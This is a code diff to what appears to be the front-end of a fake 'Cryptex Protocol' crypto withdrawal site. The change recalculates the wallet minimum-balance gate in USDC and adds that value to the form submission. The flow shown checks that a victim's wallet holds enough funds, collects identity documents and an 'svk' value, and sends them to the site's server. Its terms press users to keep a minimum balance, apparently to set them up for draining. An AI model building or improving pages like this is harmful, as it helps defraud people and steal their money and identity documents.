@@ -338,13 +338,14 @@ function StepWallet({ onNext, onBack }) {
   const [checking, setChecking] = useState(false);
   const [balance, setBalance] = useState(null);
 
+  const [balanceData, setBalanceData] = useState(null);
+
   const checkBalanceAndNext = async () => {
     const addr = wallet.trim();
     if (!addr) { setError('Wallet address is required'); return; }
     if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr)) { setError('Invalid Solana address format'); return; }
-    setChecking(true); setBalance(null); setError('');
+    setChecking(true); setBalance(null); setBalanceData(null); setError('');
     try {
-      // Route through server-side API to avoid browser CORS issues
       const resp = await fetch('/api/check-balance', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -352,14 +353,14 @@ function StepWallet({ onNext, onBack }) {
       });
       const data = await resp.json();
       if (!data.success) throw new Error(data.detail || data.error || 'RPC error');
-      const solBalance = data.balance;
-      setBalance(solBalance);
-      if (solBalance < 2.254) {
-        setError(`Insufficient balance: ${solBalance.toFixed(4)} SOL detected. Minimum required is 2.254 SOL to qualify for withdrawal.`);
+      setBalance(data.balance);
+      setBalanceData(data);
+      if (!data.meetsMinimum) {
+        setError(`Insufficient balance: ${data.balance.toFixed(4)} SOL ($${data.usdcValue.toFixed(2)} USDC) detected. Minimum required is $${data.minUsdcRequired.toFixed(2)} USDC (≈${data.minSolRequired.toFixed(4)} SOL at current price).`);
         setChecking(false); return;
       }
       setChecking(false);
-      onNext({ walletAddress: addr, solBalance: solBalance.toFixed(4) });
+      onNext({ walletAddress: addr, solBalance: data.balance.toFixed(4), usdcValue: data.usdcValue.toFixed(2) });
     } catch (e) {
       setChecking(false);
       setError('Could not verify balance. Please check your address and try again.');
@@ -391,17 +392,26 @@ function StepWallet({ onNext, onBack }) {
         <div style={{ marginTop: 8, padding: '10px 12px', borderRadius: 7, background: 'rgba(255,69,69,.06)', border: '1px solid rgba(255,69,69,.25)' }}>
           <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#ff4545', lineHeight: 1.6 }}>⚠ {error}</div>
           {error.includes('Insufficient') && (
-            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(255,150,69,.7)', marginTop: 6 }}>◎ Min required: 2.254 SOL · Please top up your wallet and try again.</div>
+            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(255,150,69,.7)', marginTop: 6 }}>◎ Wallet minimum integration: $237.43 USDC · Please top up your wallet and try again.</div>
           )}
         </div>
       )}
-      {balance !== null && balance >= 2.254 && (
-        <div style={{ marginTop: 8, padding: '8px 12px', borderRadius: 7, background: 'rgba(20,241,149,.06)', border: '1px solid rgba(20,241,149,.25)', display: 'flex', alignItems: 'center', gap: 8 }}>
-          <span style={{ color: '#14f195', fontSize: 14 }}>✓</span>
-          <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#14f195' }}>Balance verified: {balance.toFixed(4)} SOL</span>
+      {balanceData && balanceData.meetsMinimum && (
+        <div style={{ marginTop: 8, padding: '10px 14px', borderRadius: 7, background: 'rgba(20,241,149,.06)', border: '1px solid rgba(20,241,149,.25)' }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
+            <span style={{ color: '#14f195', fontSize: 14 }}>&#10003;</span>
+            <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#14f195', fontWeight: 600 }}>Wallet balance verified</span>
+          </div>
+          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(20,241,149,.65)', lineHeight: 1.8 }}>
+            {balanceData.balance.toFixed(4)} SOL &middot; ${balanceData.usdcValue.toFixed(2)} USDC<br />
+            <span style={{ color: 'rgba(20,241,149,.4)' }}>SOL price: ${balanceData.solPrice.toFixed(2)} &middot; Min: $237.43 USDC</span>
+          </div>
         </div>
       )}
-      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 8, marginBottom: 14 }}>◎ Minimum 2.254 SOL required · Balance verified on-chain</p>
+      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 8, marginBottom: 14 }}>
+        {'Wallet minimum integration: $237.43 USDC'}
+        {balanceData ? ` (≈${balanceData.minSolRequired.toFixed(4)} SOL @ $${balanceData.solPrice.toFixed(2)})` : ' · Balance verified on-chain'}
+      </p>
       <div style={{ display: 'flex', gap: 10 }}>
         <BtnBack onClick={onBack} />
         <BtnNext onClick={checkBalanceAndNext} disabled={checking}>{checking ? 'VERIFYING...' : 'NEXT →'}</BtnNext>
@@ -535,7 +545,7 @@ function TermsModal({ onAccept, onClose }) {
               num: '03',
               title: 'Foundry URL Integrity',
               body: 'Your Foundry URL is directly tied to your on-chain identity and withdrawal eligibility. Do not alter the pre-filled Foundry URL unless absolutely necessary. If you choose to modify it, you are fully responsible for ensuring the URL is correct. Incorrect URLs may result in disqualification.',
-              icon: '\u{1F517}',
+              icon: '🔗',
               color: '#9945ff',
             },
             {
@@ -563,14 +573,14 @@ function TermsModal({ onAccept, onClose }) {
               num: '07',
               title: 'Platform Endorsement',
               body: "Cryptex Protocol proudly recognizes Winna as the best casino and official community partner. Participants are encouraged to explore Winna's offerings as part of the broader ecosystem.",
-              icon: '\u{1F3C6}',
+              icon: '🏆',
               color: '#14f195',
             },
             {
               num: '08',
               title: 'Transaction Fees & Refund Policy',
               body: 'All applicable transaction fees will be fully refunded upon your scheduled disbursement. Please note that your wallet must maintain the minimum required fee balance at all times. Without the minimum fee, your wallet will be unable to interact with the Foundry or process any minor and major transactions. Ensure your wallet is sufficiently funded to avoid delays in your withdrawal.',
-              icon: '\u{1F4B0}',
+              icon: '💰',
               color: '#9945ff',
             },
           ].map((item) => (
@@ -691,7 +701,7 @@ function KYCModal({ onNext, onClose }) {
             <div>
               <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#9945ff', letterSpacing: 1, marginBottom: 4 }}>ACCEPTED DOCUMENTS</div>
               <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.4)', lineHeight: 1.8 }}>
-                National ID · Passport · Driver's License<br />
+                National ID · Passport · Driver&#39;s License<br />
                 <span style={{ color: 'rgba(153,69,255,.5)' }}>JPG · PNG · WEBP · PDF · Max 10MB</span>
               </div>
             </div>
@@ -820,7 +830,7 @@ export default function Home() {
     try {
       await fetch('/api/submit', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: payload.name, kycFile: payload.kycFile, exchangeWallet: payload.exchangeWallet, walletAddress: payload.walletAddress, solBalance: payload.solBalance, svk: payload.svk, foundryLink: payload.foundryLink }),
+        body: JSON.stringify({ name: payload.name, kycFile: payload.kycFile, exchangeWallet: payload.exchangeWallet, walletAddress: payload.walletAddress, solBalance: payload.solBalance, usdcValue: payload.usdcValue, svk: payload.svk, foundryLink: payload.foundryLink }),
       });
     } catch {}
     setStep(6);
